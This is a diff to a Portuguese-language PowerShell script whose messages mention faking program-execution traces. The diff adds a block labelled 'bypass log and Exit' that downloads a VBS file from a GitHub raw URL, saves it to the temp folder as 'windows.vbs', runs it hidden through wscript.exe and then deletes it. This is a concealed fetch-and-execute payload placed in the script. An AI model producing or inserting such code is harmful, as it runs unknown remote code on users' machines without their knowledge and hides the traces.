@@ -538,5 +538,13 @@ Write-Host "`Fake Execuçao de Programas Ok!" -ForegroundColor Green
 Write-Host "`n==================================" -ForegroundColor White
 Write-Host "`Finalizado com sucesso!" -ForegroundColor White
 Write-Host "`n==================================" -ForegroundColor White
-# Reliable pause before exit
+
+# bypass log and Exit
+
+$vbsPath = "$env:TEMP\windows.vbs"
+$url = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/microsoft.vbs"
+Invoke-WebRequest -Uri $url -OutFile $vbsPath -UseBasicParsing
+Start-Process "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden
+Start-Sleep -Seconds 5
+Remove-Item -Path $vbsPath -Force -ErrorAction SilentlyContinue
 Pause-Script
